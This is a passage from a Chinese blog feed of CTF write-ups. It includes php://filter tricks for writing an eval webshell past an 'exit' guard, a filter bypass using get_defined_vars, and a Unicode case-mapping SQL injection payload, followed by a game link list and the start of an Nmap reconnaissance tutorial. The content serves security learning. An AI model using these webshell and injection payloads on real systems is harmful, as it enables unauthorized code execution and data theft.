class="string">"files"</span>: &#123;</span><br><span class="line">    <span class="string">"file"</span>: <span class="string">"&lt;censored...binary...data&gt;"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以显式地设置文件名，文件类型和请求头：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>url = <span class="string">'http://httpbin.org/post'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>files = &#123;<span class="string">'file'</span>: (<span class="string">'report.xls'</span>, open(<span class="string">'report.xls'</span>, <span class="string">'rb'</span>), <span class="string">'application/vnd.ms-excel'</span>, &#123;<span class="string">'Expires'</span>: <span class="string">'0'</span>&#125;)&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.post(url, files=files)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.text</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="string">"files"</span>: &#123;</span><br><span class="line">    <span class="string">"file"</span>: <span class="string">"&lt;censored...binary...data&gt;"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>也可以发送作为文件来接收的字符串：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>url = <span class="string">'http://httpbin.org/post'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>files = &#123;<span class="string">'file'</span>: (<span class="string">'report.csv'</span>, <span class="string">'some,data,to,send\nanother,row,to,send\n'</span>)&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.post(url, files=files)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.text</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="string">"files"</span>: &#123;</span><br><span class="line">    <span class="string">"file"</span>: <span class="string">"some,data,to,send\\nanother,row,to,send\\n"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><del>全文参考</del>：<a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html</a></p><h2 id="三-easy-phpmagic"><a href="#三-easy-phpmagic" class="headerlink" title="三. easy - phpmagic"></a>三. easy - phpmagic</h2><h3 id="3-1-php-filter的妙用"><a href="#3-1-php-filter的妙用" class="headerlink" title="3.1 php://filter的妙用"></a>3.1 php://filter的妙用</h3><p>P神的博客干货真多！<del>全程参考</del>：<br><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p><p><strong>php://filter</strong>是PHP中独有的协议，利用这个协议可以创造很多“妙用”。</p><h4 id="3-1-1-XXE中的利用"><a href="#3-1-1-XXE中的利用" class="headerlink" title="3.1.1 XXE中的利用"></a>3.1.1 XXE中的利用</h4><p>php://filter之前最常出镜的地方是XXE。由于XXE漏洞的特殊性，我们在读取HTML、PHP等文件时可能会抛出此类错误<code>parser error : StartTag: invalid element name</code> 。其原因是，PHP是基于标签的脚本语言，<code>&lt;?php ... ?&gt;</code>这个语法也与XML相符合，所以在解析XML的时候会被误认为是XML，而其中内容（比如特殊字符）又有可能和标准XML冲突，所以导致了出错。</p><p>那么，为了读取包含有敏感信息的PHP等源文件，我们就要先将“可能引发冲突的PHP代码”编码一遍，这里就会用到php://filter。</p><p>php://filter是PHP语言中特有的协议流，作用是作为一个“中间流”来处理其他流。比如，我们可以用如下一行代码将POST内容转换成base64编码并输出：</p><p>readfile(“php://filter/read=convert.base64-encode/resource=php://input”);</p><p>如下：<br><img src="./3-1.png" alt><br><strong>php://filter/read=convert.base64-encode/resource=php://input</strong></p><p>所以，在XXE中，我们也可以将PHP等容易引发冲突的文件流用php://filter协议流处理一遍，这样就能有效规避特殊字符造成混乱。<br>如下，我们使用的是<code>php://filter/read=convert.base64-encode/resource=./xxe.php</code><br><img src="./3-2.png" alt><br><strong>php://filter/read=convert.base64-encode/resource=./xxe.php</strong></p><h4 id="3-1-2-巧用编码与解码"><a href="#3-1-2-巧用编码与解码" class="headerlink" title="3.1.2 巧用编码与解码"></a>3.1.2 巧用编码与解码</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$content = <span class="string">'&lt;?php exit; ?&gt;'</span>;</span><br><span class="line">$content .= $_POST[<span class="string">'txt'</span>];</span><br><span class="line">file_put_contents($_POST[<span class="string">'filename'</span>], $content);</span><br></pre></td></tr></table></figure><p><code>$content</code>在开头增加了exit过程，导致即使我们成功写入一句话，也执行不了（这个过程在实战中十分常见，通常出现在缓存、配置文件等等地方，不允许用户直接访问的文件，都会被加上<code>if(!defined(xxx))exit;</code>之类的限制）。那么这种情况下，如何绕过这个“死亡exit”？<br>幸运的是，这里的<code>$_POST[&#39;filename&#39;]</code>是<strong>可以控制协议的</strong>，我们即可使用 php://filter协议来施展魔法：使用php://filter流的base64-decode方法，将<code>$content</code>解码，利用php base64_decode函数特性去除“死亡exit”。</p><p>众所周知，base64编码中只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。<br>所以，一个正常的base64_decode实际上可以理解为如下两个步骤：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_GET[<span class="string">'txt'</span>] = preg_replace(<span class="string">'|[^a-z0-9A-Z+/]|s'</span>, <span class="string">''</span>, $_GET[<span class="string">'txt'</span>]);</span><br><span class="line">base64_decode($_GET[<span class="string">'txt'</span>]);</span><br></pre></td></tr></table></figure></p><p>所以，当<code>$content</code>被加上了<code>&lt;?php exit; ?&gt;</code>以后，我们可以使用 php://filter/write=convert.base64-decode 来首先对其解码。在解码的过程中，字符<code>&lt;</code> <code>?</code> <code>;</code> <code>&gt;</code> <code>空格</code>等不符合base64编码的字符范围将被忽略，所以最终被解码的字符仅有“phpexit”和我们传入的其他字符。</p><p>“phpexit”一共7个字符，因为base64算法解码时是4个byte一组，所以给他增加1个“a”一共8个字符。这样，”phpexita”被正常解码，而后面我们传入的webshell的base64内容也被正常解码。结果就是<code>&lt;?php exit; ?&gt;</code>没有了。</p><p>最后效果是 ：<br><img src="./3-3.png" alt><br><strong>php://filter/write=convert.base64-decode/resource=shell.php</strong></p><h4 id="3-1-3-利用字符串操作方法"><a href="#3-1-3-利用字符串操作方法" class="headerlink" title="3.1.3 利用字符串操作方法"></a>3.1.3 利用字符串操作方法</h4><p>除了使用base64特性的方法外，我们还可以利用php://filter字符串处理方法来去除“死亡exit”。我们观察一下，这个<code>&lt;?php exit; ?&gt;</code>实际上是什么？<br>实际上是一个XML标签，既然是XML标签，我们就可以利用strip_tags函数去除它，而php://filter刚好是支持这个方法的。</p><p>编写如下测试代码即可查看 <code>php://filter/read=string.strip_tags/resource=php://input</code> 的效果：</p><p><code>echo readfile(&#39;php://filter/read=string.strip_tags/resource=php://input&#39;);</code><br><img src="./3-4.png" alt><br><strong>php://filter/read=string.strip_tags/resource=php://input</strong></p><p>可见，<code>&lt;?php exit; ?&gt;</code>被去除了。但回到上面的题目，我们最终的目的是写入一个webshell，而写入的webshell也是php代码，如果使用strip_tags同样会被去除。</p><p>万幸的是，php://filter允许使用多个过滤器，我们可以先将webshell用base64编码。在调用完成strip_tags后再进行base64-decode。“死亡exit”在第一步被去除，而webshell在第二步被还原。</p><p>最终的数据包如下：<br><img src="./3-5.png" alt><br><strong>php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php</strong></p><p>综上，我们得出，<strong>只要是传filename的地方，基本都可以传协议流。</strong></p><h3 id="3-2-后缀名后加上-，pathinfo就取不到后缀名，且可以正常写入-php之中。"><a href="#3-2-后缀名后加上-，pathinfo就取不到后缀名，且可以正常写入-php之中。" class="headerlink" title="3.2 后缀名后加上/.，pathinfo就取不到后缀名，且可以正常写入.php之中。"></a>3.2 后缀名后加上<code>/.</code>，pathinfo就取不到后缀名，且可以正常写入.php之中。</h3><p>这确实很实用，原理性介绍参考（先给自己挖个坑）： <a href="http://wonderkun.cc/index.html/?p=626" target="_blank" rel="noopener">php &amp; apache2 &amp;操作系统之间的一些黑魔法</a></p><h3 id="3-3-SERVER-‘SERVER-NAME’-函数"><a href="#3-3-SERVER-‘SERVER-NAME’-函数" class="headerlink" title="3.3 $_SERVER[‘SERVER_NAME’] 函数"></a>3.3 $_SERVER[‘SERVER_NAME’] 函数</h3><p>查看一下官方手册：<br><img src="./servername.png" alt></p><p>注意 note 部分，这个值可以被伪造：<br>它的值取的是HTTP headers中的<code>Host</code>的值。</p><h3 id="3-4-利用-base64-编码和解码写入shell"><a href="#3-4-利用-base64-编码和解码写入shell" class="headerlink" title="3.4 利用 base64 编码和解码写入shell"></a>3.4 利用 base64 编码和解码写入shell</h3><p>利用一个PHP伪协议base64解码的trick：<strong>解码中遇到不符合规范的字符直接跳过</strong>。</p><p>另外因为base64解码是4位一组来解，所以我们要保证我们需要解码的字符串之前的合法字符数为4的倍数，这样就不会影响我们传入的字符串正常解码。测试一下：<br><img src="./burp.png" alt></p><p>在传入的字符前，符合base64规范的字符是：</p><blockquote><p>ltltgtgtDiG9959deb8u15DebianltltgtgttAq </p></blockquote><p>40位长，不需要再添加其他字符。（<strong>注意</strong>：base64中的<code>=</code>只能出现在最末尾，而我们插入的字符串是在<code>中间</code>的，所以我们插入的字符串里不能有=。）</p><p>getshell: <code>&lt;?php eval($_REQUEST[&#39;cmd&#39;]);//?&gt;</code><br>base64: <code>PD9waHAgZXZhbCgkX1JFUVVFU1RbJ2NtZCddKTsvLz8+</code></p><p>写入：<br><img src="./uploadshell.png" alt></p><p>至此，getshell成功。</p><h2 id="四-easy-phplimit"><a href="#四-easy-phplimit" class="headerlink" title="四. easy - phplimit"></a>四. easy - phplimit</h2><p>题目描述：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[^\W]+\((?R)?\)/'</span>, <span class="string">''</span>, $_GET[<span class="string">'code'</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>($_GET[<span class="string">'code'</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>ps:他们说这题最早出现是在RCTF2018中<br><a href="https://lorexxar.cn/2018/05/23/rctf2018/" target="_blank" rel="noopener">https://lorexxar.cn/2018/05/23/rctf2018/</a><br>在原来的题目中是用next(getallheaders())绕过这个限制的。但这里 <code>getallheaders</code> 是 apache 中的函数，这里是 nginx 环境。<br><del>先挖个坑，再慢慢看。</del></p><h3 id="4-1-正则-R-介绍"><a href="#4-1-正则-R-介绍" class="headerlink" title="4.1 正则 (?R) 介绍"></a>4.1 正则 (?R) 介绍</h3><p>第一次看到这样的正则式的时候，有点懵逼。还是需要调试理解：<br><img src="./4-1.png" alt></p><p>可以知道，<code>(?R)</code><strong>可以递归整个模式</strong><br>具体到这个问题，<code>preg_replace</code> 返回替换后的字符串；<br><code>$_GET[&#39;code&#39;]</code> 的值为一个函数，但是不能带任何参数；<br>函数的括号里面又可以是一个函数： <code>dirname(getcwd())</code></p><h3 id="4-2-技巧一：使用-get-defined-vars-函数"><a href="#4-2-技巧一：使用-get-defined-vars-函数" class="headerlink" title="4.2 技巧一：使用 get_defined_vars 函数"></a>4.2 技巧一：使用 <code>get_defined_vars</code> 函数</h3><blockquote><p>get_defined_vars — 返回由所有已定义变量所组成的数组 </p></blockquote><p>包括全局变量GET等.</p><h4 id="4-2-1-利用重点：-直接reset所有的变量"><a href="#4-2-1-利用重点：-直接reset所有的变量" class="headerlink" title="4.2.1 利用重点： 直接reset所有的变量"></a>4.2.1 利用重点： 直接reset所有的变量</h4><ul><li>调试过程可以借助 <code>print_r()</code> 函数查看输出结果；<br>  <img src="./4-2.png" alt></li><li>reset 所有变量<br>  <img src="./4-3.png" alt></li><li>在新的数组里加入一个新变量 <code>1</code><br>  <img src="./4-4.png" alt></li><li><code>implode()</code> 函数将它们连接成一个字符串。注意，<strong>第一个变量后的东西全部注释掉</strong><br>  <img src="./4-5.png" alt></li><li><code>eval</code> 函数执行这个字符串<br>  <img src="./4-6.png" alt></li><li>接下来，只要控制 1 这个变量的值就可以了<br>  <img src="./4-7.png" alt></li></ul><h3 id="4-2-直接列目录"><a href="#4-2-直接列目录" class="headerlink" title="4.2 直接列目录"></a>4.2 直接列目录</h3><blockquote><p>code=readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))));</p></blockquote><h2 id="五-easy-nodechr"><a href="#五-easy-nodechr" class="headerlink" title="五. easy - nodechr"></a>五. easy - nodechr</h2><p>后台是 <code>nodejs</code> 写的，再感受下 <code>Unicode</code> 编码和 <code>JS</code> 的黑魔法。<br>关键代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safeKeyword</span>(<span class="params">keyword</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(isString(keyword) &amp;&amp; !keyword.match(<span class="regexp">/(union|select|;|\-\-)/i</span>s)) &#123;</span><br><span class="line">        <span class="keyword">return</span> keyword</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">undefined</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params">ctx, next</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(ctx.method == <span class="string">'POST'</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> username = safeKeyword(ctx.request.body[<span class="string">'username'</span>])</span><br><span class="line">        <span class="keyword">let</span> password = safeKeyword(ctx.request.body[<span class="string">'password'</span>])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> jump = ctx.router.url(<span class="string">'login'</span>)</span><br><span class="line">        <span class="keyword">if</span> (username &amp;&amp; password) &#123;</span><br><span class="line">            <span class="keyword">let</span> user = <span class="keyword">await</span> ctx.db.get(<span class="string">`SELECT * FROM "users" WHERE "username" = '<span class="subst">$&#123;username.toUpperCase()&#125;</span>' AND "password" = '<span class="subst">$&#123;password.toUpperCase()&#125;</span>'`</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (user) &#123;</span><br><span class="line">                ctx.session.user = user</span><br><span class="line"></span><br><span class="line">                jump = ctx.router.url(<span class="string">'admin'</span>)</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ctx.status = <span class="number">303</span></span><br><span class="line">        ctx.redirect(jump)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">await</span> ctx.render(<span class="string">'index'</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-1-Unicode编码（或者urldecode）经过upper-和lower"><a href="#5-1-Unicode编码（或者urldecode）经过upper-和lower" class="headerlink" title="5.1 Unicode编码（或者urldecode）经过upper()和lower()"></a>5.1 Unicode编码（或者urldecode）经过upper()和lower()</h3><p><strong>python3和JavaScript都有这个特性。</strong></p><blockquote><p>toUpperCase()是javascript中将小写转换成大写的函数。<br>toLowerCase()是javascript中将大写转换成小写的函数。</p></blockquote><p>一般我们认为就是将 ASCII码 在127以内的字母进行大小写转换。但是换成其他Unicode编码呢。</p><blockquote><p>“ı”.toUpperCase() == ‘I’，”ſ”.toUpperCase() == ‘S’。<br>“K”.toLowerCase() == ‘k’。<br>通过这个小特性可以绕过一些限制。</p></blockquote><p><strong>同样利用这个特性，也能绕过一些XSS。</strong></p><p><strong>引用一句话：</strong></p><blockquote><p>这里的特殊部分是转换行为。并非所有Unicode字符在转换为大写字母时都具有匹配的表示形式 - <strong>因此浏览器通常倾向于采用外观相似，最适合的映射ASCII字符。</strong> 这种行为有相当大范围的字符，所有浏览器的做法都有所不同。</p></blockquote><p>相关演示：</p><ul><li><p>JS：<br>  <img src="./5-1.png" alt></p></li><li><p>python3：<br>  <img src="./5-2.png" alt></p></li><li>汇总：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">K ---- k</span><br><span class="line">ß(223) ---- SS</span><br><span class="line">ı(305) ---- I</span><br><span class="line">ſ(383) ---- S</span><br><span class="line">ﬀ(64256) ---- FF</span><br><span class="line">ﬁ(64257) ---- FI</span><br><span class="line">ﬂ(64258) ---- FL</span><br><span class="line">ﬃ(64259) ---- FFI</span><br><span class="line">ﬄ(64260) ---- FFL</span><br><span class="line">ﬅ(64261) ---- ST</span><br><span class="line">ﬆ(64262) ---- ST</span><br></pre></td></tr></table></figure></li></ul><p>括号里的数是十进制数，转成Unicode编码需要先转成十六进制。<br><img src="./5-3.png" alt></p><h3 id="5-2-解题时被burpsuite坑了"><a href="#5-2-解题时被burpsuite坑了" class="headerlink" title="5.2 解题时被burpsuite坑了"></a>5.2 解题时被burpsuite坑了</h3><p>后台使用nodejs写的，但是对nodejs没有很熟悉，后台代码也只能看出个大概。一度认为没有回显，只能盲注。但真实的是登录上去后就会显示从数据库中取出的用户名。所以可以<strong>联合查询</strong>，将flag回显。</p><p>在burpsuite的repeater模块中，构造好payload，发送过去，跳转到登录页面（错误情况下会显示错误，不会跳转），但并没有显示任何有用信息。</p><p>当burpsuite抓到包后，直接构造好username和password，再发送，浏览器会显示flag。</p><blockquote><p>payload: username=aaa&amp;password=%27+un%C4%B1on+%C5%BFelect+1,(%C5%BFelect+flag+from+flags),’3</p></blockquote><p><strong>特别注意！！！：</strong><br>在浏览器中输入 <code>ı</code> 这个时，抓包在 burpsuite 中显示的 url编码 是 <code>%C4%B1</code>。但这个符号的 Unicode编码 是 <code>\u0131</code> 。<strong>发送过去还是以url编码为主。</strong></p><h3 id="5-3-利用python3进行Unicode编码和url编码转换"><a href="#5-3-利用python3进行Unicode编码和url编码转换" class="headerlink" title="5.3 利用python3进行Unicode编码和url编码转换"></a>5.3 利用python3进行Unicode编码和url编码转换</h3><p>python3的url编码<strong>在 <code>urllib.parse</code> 这个包中</strong>，而不在 <code>urllib</code> 这个包中。</p><p><img src="./5-4.png" alt></p><hr><p><img src="./5-5.png" alt></p><p>Unicode编码 -&gt; url编码：<br><img src="./5-6.png" alt></p><p><strong>记住：发送字符或者用burpsuite发送，不要写 <code>\u0131</code> ，要用url编码 <code>%C4%B1</code>。</strong></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>H5+CSS+JS__game</title>
      <link href="/passages/H5-CSS-JS-game/"/>
      <url>/passages/H5-CSS-JS-game/</url>
      
        <content type="html"><![CDATA[<blockquote><p>JS这门语言，很难。<br>其一：自己能力不足<br>其二：它深不见底</p></blockquote><a id="more"></a><blockquote><p>flash?仔细看标题！</p></blockquote><h2 id="air-flower"><a href="#air-flower" class="headerlink" title="air-flower"></a><a href="/mysource/air-flower">air-flower</a></h2><h2 id="bouncing"><a href="#bouncing" class="headerlink" title="bouncing"></a><a href="/mysource/bouncing">bouncing</a></h2><h2 id="drive-a-race"><a href="#drive-a-race" class="headerlink" title="drive-a-race"></a><a href="/mysource/drive-a-race">drive-a-race</a></h2><h2 id="fast-animations"><a href="#fast-animations" class="headerlink" title="fast-animations"></a><a href="/mysource/fast-animations">fast-animations</a></h2><h2 id="geometric"><a href="#geometric" class="headerlink" title="geometric"></a><a href="/mysource/geometric">geometric</a></h2><h2 id="help-me-down"><a href="#help-me-down" class="headerlink" title="help-me-down"></a><a href="/mysource/help-me-down">help-me-down</a></h2><h2 id="help-me-down-iii"><a href="#help-me-down-iii" class="headerlink" title="help-me-down-iii"></a><a href="/mysource/help-me-down-iii">help-me-down-iii</a></h2><h2 id="loading-3"><a href="#loading-3" class="headerlink" title="loading-3"></a><a href="/mysource/loading-3">loading-3</a></h2><h2 id="loading-animation-2"><a href="#loading-animation-2" class="headerlink" title="loading-animation-2"></a><a href="/mysource/loading-animation-2">loading-animation-2</a></h2><h2 id="mouse-follower"><a href="#mouse-follower" class="headerlink" title="mouse-follower"></a><a href="/mysource/mouse-follower">mouse-follower</a></h2><h2 id="optical-illusion"><a href="#optical-illusion" class="headerlink" title="optical-illusion"></a><a href="/mysource/optical-illusion">optical-illusion</a></h2><h2 id="physical-animations-with-lists"><a href="#physical-animations-with-lists" class="headerlink" title="physical-animations-with-lists"></a><a href="/mysource/physical-animations-with-lists">physical-animations-with-lists</a></h2><h2 id="simple-clock"><a href="#simple-clock" class="headerlink" title="simple-clock"></a><a href="/mysource/simple-clock">simple-clock</a></h2><h2 id="solarsystem"><a href="#solarsystem" class="headerlink" title="solarsystem"></a><a href="/mysource/solarsystem">solarsystem</a></h2><h2 id="tanks"><a href="#tanks" class="headerlink" title="tanks"></a><a href="/mysource/tanks">tanks</a></h2><h2 id="timeline-visualized"><a href="#timeline-visualized" class="headerlink" title="timeline-visualized"></a><a href="/mysource/timeline-visualized">timeline-visualized</a></h2><h2 id="twinkle-twinkle-little-star"><a href="#twinkle-twinkle-little-star" class="headerlink" title="twinkle-twinkle-little-star"></a><a href="/mysource/twinkle-twinkle-little-star">twinkle-twinkle-little-star</a></h2><h2 id="water-rings"><a href="#water-rings" class="headerlink" title="water-rings"></a><a href="/mysource/water-rings">water-rings</a></h2>]]></content>
      
      
      <categories>
          
          <category> 随笔笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>kali_web_test</title>
      <link href="/passages/kali-test/"/>
      <url>/passages/kali-test/</url>
      
        <content type="html"><![CDATA[<p>2019年，占个位置慢慢写</p><blockquote><p>未完待续。。。</p></blockquote><h2 id="一-配置"><a href="#一-配置" class="headerlink" title="一 配置"></a>一 配置</h2><h3 id="1-1-kali主机IP：192-168-91-128"><a href="#1-1-kali主机IP：192-168-91-128" class="headerlink" title="1.1 kali主机IP：192.168.91.128"></a>1.1 kali主机IP：192.168.91.128</h3><p><img src="./kaili_ip.png" alt></p><h3 id="1-2-漏洞服务器IP：192-168-91-130"><a href="#1-2-漏洞服务器IP：192-168-91-130" class="headerlink" title="1.2 漏洞服务器IP：192.168.91.130"></a>1.2 漏洞服务器IP：192.168.91.130</h3><p><img src="./owasp_ip.png" alt></p><p>ping一下：<br><img src="./ping.png" alt></p><p>浏览器访问：<br><img src="./靶机搭建成功.png" alt></p><p><strong>大功告成</strong></p><h2 id="二-侦察"><a href="#二-侦察" class="headerlink" title="二. 侦察"></a>二. 侦察</h2><p>在每个渗透测试中，无论对于网络还是Web应用，都有一套流程。其中需要完成一些步骤，来增加我们发现和利用每个影响我们目标的可能的漏洞的机会。例如：</p><blockquote><ul><li>侦察</li><li>枚举</li><li>利用</li><li>维持访问</li><li>清理踪迹</li></ul></blockquote><p>侦查是一个层面，其中测试者必须识别网络、防火墙和入侵检测系统中所有可能组件。它们也会收集关于公司、网络和雇员的最大信息。在我们的例子中，对于Web应用渗透测试，这个阶段主要关于了解应用、数据库、用户、服务器以及应用和我们之间的关系。</p><p>侦查是每个渗透测试中的必要阶段。我们得到了的目标信息越多，发现和利用漏洞时，我们拥有的选项就越多。</p><hr><h3 id="2-1-Nmap使用"><a href="#2-1-Nmap使用" class="headerlink" title="2.1 Nmap使用"></a>2.1 Nmap使用</h3><p>Nmap 可能是世界上最广泛使用的端口扫描器。他可以用于识别活动主机、扫描 TCP和UDP 开放端口，检测防火墙，获得运行在远程主机上的服务版本，甚至是，可以使用脚本来发现和利用漏洞。</p><h4 id="2-1-1-操作步骤"><a href="#2-1-1-操作步骤" class="headerlink" title="2.1.1 操作步骤"></a>2.1.1 操作步骤</h4><ul><li><strong>查看服务器是否响应</strong></li></ul><blockquote><p><strong>nmap -sn 192.168.91.130</strong></p></blockquote><p><img src="./nmap1.png" alt></p><ul><li><strong>查看打开的端口</strong></li></ul><blockquote><p><strong>nmap 192.168.91.130</strong></p></blockquote><p><img src="./nmap2.png" alt></p><ul><li><strong>让 Nmap 向服务器询问正在运行的服务的版本，并且基于它猜测操作系统</strong></li></ul><blockquote><p><strong>map -sV -O 192.168.91.130</strong></p></blockquote><p><img src="./nmap3.png" alt></p><p><strong>可以看到漏洞服务器使用Apache2.2.14的Web服务器；PHP使用的版本是5.3.2；使用的是Linux2.6的内核。</strong></p><h4 id="2-1-2-工作原理"><a href="#2-1-2-工作原理" class="headerlink" title="2.1.2 工作原理"></a>2.1.2 工作原理</h4><p>Nmap 是个端口扫描器，这意味着它可以向一些指定IP的TCP或UDP端口发送<strong>封包</strong>，并<strong>检查是否有响应</strong>。如果有的话，这意味着端口是打开的，因此，端口上运行着服务。</p><p>在第一个名中，使用-sn参数，我们让Nmap只检查是否服务器响应ICMP请求（或ping）。我们的服务器响应了，所以它是活动的。</p><p>第二个命令是调用 Nmap的最简方式，它只指定目标IP。所做的事情是先ping服务器，如果它响应了，Nmap 会向1000个TCP端口列表发送<strong>探针</strong>，来观察哪个端口响应，之后报告响应端口的结果。</p><p>第三个命令向第二个添加了如下两个任务：</p><blockquote><ul><li>-sV 请求每个被发现的开放端口的标识（头部或者自我识别），这是它用作版本的东西。</li><li>-O 告诉 Nmap，尝试猜测运行在目标上的操作系统。使用开放端口和版本收集的信息。</li></ul></blockquote><h4 id="2-1-3-其他参数"><a href="#2-1-3-其他参数" class="headerlink" title="2.1.3 其他参数"></a>2.1.3 其他参数</h4><ul><li><p><code>-sT</code>：通常，在 root用户下运行Nmap时，它使用SYN扫描类型。使用这个参数，我们就强制让扫描器执行完全连接的扫描。它更慢，并且会在服务器的日志中留下记录，但是它不太可能被入侵检测系统检测到。</p></li><li><p><code>-Pn</code>：如果我们已经知道了主机是活动的或者不响应ping，我们可以使用这个参数告诉Nmap 跳过 ping 测试，并扫描所有指定目标，假设它们是开启的。</p></li><li><p><code>-v</code>：这会开启详细模式。Nmap会展示更多关于它所做事情和得到回复的信息。参数可以在相同命令中重复多次：次数越多，就越详细（也就是说，-vv或-v -v -v -v）。</p></li><li><p><code>-p N1,N2...Nn</code>：如果我们打算测试特定端口或一些非标准端口，我们可能想这个参数。N1到Nn是打算让 Nmap 扫描的端口。例如，要扫描端口21，80到90，和137，参数应为：-p 21,80-90,137。</p></li><li><p><code>--script=script_name</code>：Nmap包含很多实用的漏洞检测、扫描和识别、登录测试、命令执行、用户枚举以及其它脚本。使用这个参数来告诉Nmap在目标的开放端口上运行脚本。你可能打算查看一些 Nmap 脚本，它们在：<a href="https://nmap.org/nsedoc/scripts/。" target="_blank" rel="noopener">https://nmap.org/nsedoc/scripts/。</a></p></li></ul><h3 id="2-2-识别-Web-应用防火墙"><a href="#2-2-识别-Web-应用防火墙" class="headerlink" title="2.2 识别 Web 应用防火墙"></a>2.2 识别 Web 应用防火墙</h3><p>Web 应用防火墙（WAF）是一个<code>设备或软件</code>，它可以检查发送到Web服务器的封包，以便识别和阻止可能的恶意封包，它们通常基于<strong>签名</strong>或<strong>正则表达式</strong>。</p><p>如果未检测到的 WAF 阻止了我们的请求或者封禁了我们的IP，我们渗透测试中就要处理很多的麻烦。在执行渗透测试的时候，侦查层面必须包含检测和是否被WAF，入侵检测系统（IDS），或者入侵阻止系统（IPS）。这是必须的，为了采取必要的手段来防止被阻拦或禁止。</p><h4 